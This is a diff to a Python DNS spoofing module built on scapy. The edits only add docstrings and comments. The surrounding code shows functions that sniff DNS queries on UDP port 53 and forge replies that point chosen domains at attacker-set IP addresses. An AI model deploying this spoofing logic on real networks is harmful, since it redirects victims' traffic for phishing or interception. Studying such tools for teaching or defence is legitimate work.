@@ -1,4 +1,4 @@
-"""This package contains everything related to DNS spoofing"""
+'''This package contains everything related to DNS spoofing'''
 
 import threading
 import time
@@ -6,6 +6,7 @@ import click
 from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
 from functions.domains import get_domains
 
+# Interface used for sniffing dns queries
 interface = "udp port 53"
 
 # Global flag to indicate when to stop sniffing
@@ -34,6 +35,10 @@ def spoof_dns_single():
 
 
 def start_attack(table):
+    '''
+    Starts dns attack given a table chosen by user
+    '''
+
     # Start subthread running attack
     attack_thread = threading.Thread(target=attack, args=(table,))
     attack_thread.start()
@@ -47,11 +52,20 @@ def start_attack(table):
         stop_event.set()
         attack_thread.join()
 
+
 def attack(table):
+    '''
+    Sniffs network for DNS packets
+    '''
+
     sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), stop_filter=stop_event.is_set())
 
 
 def analyze_packet(packet, table):
+    '''
+    Analyzes dns packets sniffed by attack
+    '''
+
     # check for proper DNS reqs only
     if not packet.haslayer(DNS) or not packet.haslayer(IP):
         return
@@ -69,6 +83,10 @@ def analyze_packet(packet, table):
 
 
 def spoof_packet(packet, spoofed_domain, spoofed_ip):
+    '''
+    Creates a packet to spoof victim
+    '''
+
     # Make DNS template message
     spoofed_reply = IP() / UDP() / DNS()
 
@@ -97,6 +115,10 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip):
 
 
 def get_packet_query_name(dns_packet):
+    '''
+    Gets the domain query without www. from a dns packet
+    '''
+
     name = dns_packet.qd.qname[:-1].decode()
 
     # Remove "www." from the beginning of the name
